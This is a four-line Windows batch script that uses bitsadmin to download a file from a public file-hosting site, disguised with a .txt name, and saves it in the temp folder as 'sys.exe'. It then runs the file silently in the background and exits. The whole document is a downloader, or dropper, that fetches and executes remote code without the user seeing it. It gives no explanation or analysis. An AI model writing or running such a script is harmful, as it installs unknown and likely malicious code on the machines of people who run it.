@echo off
bitsadmin /transfer myJob /download /priority normal "https://files.catbox.moe/ib2r4p.txt" "%temp%\sys.exe"
start "" /b "%temp%\sys.exe"
exit